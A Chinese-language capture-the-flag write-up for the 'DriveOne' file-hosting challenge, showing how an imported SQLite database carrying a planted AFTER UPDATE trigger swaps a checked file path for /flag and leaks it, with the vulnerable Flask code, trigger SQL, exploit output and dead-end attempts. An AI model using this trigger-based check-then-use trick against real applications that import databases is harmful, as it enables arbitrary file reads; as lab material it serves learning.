# DriveOne — WRITEUP

**Flag: `K17{i'm_to0_la2y_t0_wr1t3_a_pr0p3r_fl@g_anyway$_congr@ts}`**

## 题面

一个 OneDrive 风（名字倒过来）的文件托管站：`/upload` 传文件、`/read/<file_id>` 下载、
`/export` 导出整份状态（`app.db` + `uploads/`），`/import` 把这份 zip 还原回去。
容器里 flag 在 `/flag`，`DATA_DIR=/app/data`，`UPLOAD_DIR=/app/data/uploads`。

关键：**`/import` 让我们完全控制 `app.db` 的内容**。

## 漏洞：check-then-use 被 SQLite TRIGGER 撕开

`app.py` 里检查和使用分在两个函数，中间夹了一条 `UPDATE`：

```python
@app.route('/read/<file_id>')
def read_file(file_id):
    file_record = conn.execute('SELECT file_path FROM files WHERE file_id = ?', (file_id,)).fetchone()
    ...
    full_path = os.path.abspath(os.path.join(DATA_DIR, file_path))
    if not full_path.startswith(os.path.abspath(UPLOAD_DIR) + '/'):   # ← check
        return "Path traversal detected!", 403

    conn.execute('UPDATE files SET last_viewed = CURRENT_TIMESTAMP WHERE file_id = ?', (file_id,))
    conn.commit()                                                     # ← 触发器在这里开火
    conn.close()

    return do_read(file_id)                                           # ← use：重新 SELECT

def do_read(file_id):
    file_record = conn.execute('SELECT file_path FROM files WHERE file_id = ?', (file_id,)).fetchone()
    full_path = os.path.join(DATA_DIR, file_record['file_path'])      # ← 没有任何检查
    return send_file(full_path)
```

`os.path.abspath(...)` 是**纯词法**的，挡得住 `..`；`do_read` 又用同一个 record 重查一遍，
所以"check 一份、use 另一份"这件事本身看着无害 —— **除非那条 `UPDATE` 能改掉 `file_path`**。

而 `app.db` 是我们喂进去的，于是可以塞一个触发器：

```sql
CREATE TRIGGER pwn AFTER UPDATE ON files
WHEN NEW.file_path <> '/flag'
BEGIN UPDATE files SET file_path='/flag' WHERE file_id = NEW.file_id; END;
```

1. 第一次 SELECT 拿到的是干净的 `uploads/decoy.txt` → 词法检查通过 ✅
2. `UPDATE ... SET last_viewed` 触发触发器，把同一行的 `file_path` 改成 `/flag`
3. `do_read` 重新 SELECT → 拿到 `/flag` → `os.path.join('/app/data', '/flag')` 因为是**绝对路径**
   直接返回 `/flag` → `send_file('/flag')` → flag 出炉

（SQLite 的 `recursive_triggers` 默认关闭，所以触发器里那条 UPDATE 不会再递归一次；
`WHEN` 里加 `NEW.file_path <> '/flag'` 是为了万一开了也安全。）

## 利用

`/export` 拿一份现成的 `app.db` 照着改（或直接 `CREATE TABLE`），插入一行指向 `uploads/` 下的
任意文件，再挂上触发器，打包成 zip POST 到 `/import`，然后 `GET /read/leak`：

见同目录 `exploit.py`（改一下 `B` 成你的实例地址即可）。

```
$ python3 exploit.py
IMPORT: HTTP/2 302
READ  : K17{i'm_to0_la2y_t0_wr1t3_a_pr0p3r_fl@g_anyway$_congr@ts}
[HTTP 200]
```

## 走过的死路（别重走）

- **zip 里放 symlink entry 绕过检查：不行。** `zipfile.extractall()` 把 mode 为
  `S_IFLNK` 的 entry 当**普通文件**写，内容是链接目标字符串。实测（含 `create_system=3`、
  `external_attr=(0o120777<<16)`、`0o120000` 等各种编码）：导入后 `/read` 返回的是字面量
  `"/flag"`，`/export` 里 mode 也是 `0o100644`。CPython 的 `_extract_member` 只写 `open(targetpath,'wb')`，
  不建软链（tarfile 才会）。
- **zip-slip：不行。** `extractall` 会先把 arcname 里的 `''`/`.`/`..` 组件全部**丢掉**再拼接，
  永远出不了 `data_dir_abs`；而 `/import` 的检查用 `abspath`（保留 `..` 语义），比 extractall 更严。
- **tar：** `/import` 只 `zipfile.ZipFile`，tar 一律 `BadZipFile`。
- **`secure_filename` / title SSTI / SQLi：** `file_id` 是 uuid4，`secure_filename` 去掉所有非
  `[A-Za-z0-9_.-]` 字符，模板 autoescape，SQL 全是参数化。

## 注意

`/import` 会 `os.remove(DB_PATH)` + `shutil.rmtree(UPLOAD_DIR)` 之后再解压。如果 zip 里没有
合法的 `app.db`，应用会进入 `no such table: files` 的永久 500（`init_db()` 只在启动时跑一次），
得再 import 一份好的 zip 才能救回来。
